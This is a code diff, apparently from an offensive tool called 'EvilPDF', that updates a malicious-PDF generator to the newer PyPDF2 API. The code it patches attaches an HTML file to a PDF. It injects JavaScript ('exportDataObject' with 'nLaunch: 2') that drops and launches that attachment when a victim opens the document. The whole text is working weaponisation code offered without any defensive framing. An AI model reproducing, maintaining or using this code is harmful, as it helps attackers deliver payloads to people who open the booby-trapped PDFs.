@@ -5,7 +5,7 @@
 
 import os, time, signal, sys
 from random import randint
-from PyPDF2 import PdfFileWriter, PdfFileReader
+from PyPDF2 import PdfWriter, PdfReader
 
 try:
     input = raw_input
@@ -39,13 +39,13 @@ def create_pdf(url,pdf_name,payload_name):
  time.sleep(2)
  if pdf_name == "":
    pdf_name=open('adobe.pdf', 'rb')
- unmeta=PdfFileReader("%s" % (pdf_name), "rb")
- meta=PdfFileWriter()
- meta.appendPagesFromReader(unmeta)
- meta.addJS('this.exportDataObject({ cName: "page.html", nLaunch: 2 });')
+ unmeta=PdfReader("%s" % (pdf_name), "rb")
+ meta=PdfWriter()
+ meta.append_pages_from_reader(unmeta)
+ meta.add_js('this.exportDataObject({ cName: "page.html", nLaunch: 2 });')
  with open("page.html", "rb") as fp:
      print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Attaching page.html to PDF...\033[0m")
-     meta.addAttachment("page.html", fp.read())
+     meta.add_attachment("page.html", fp.read())
  with open("%s" % (pdf_name), "wb") as fp:
    meta.write(fp)
  print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] EvilPDF created!\033[0m")
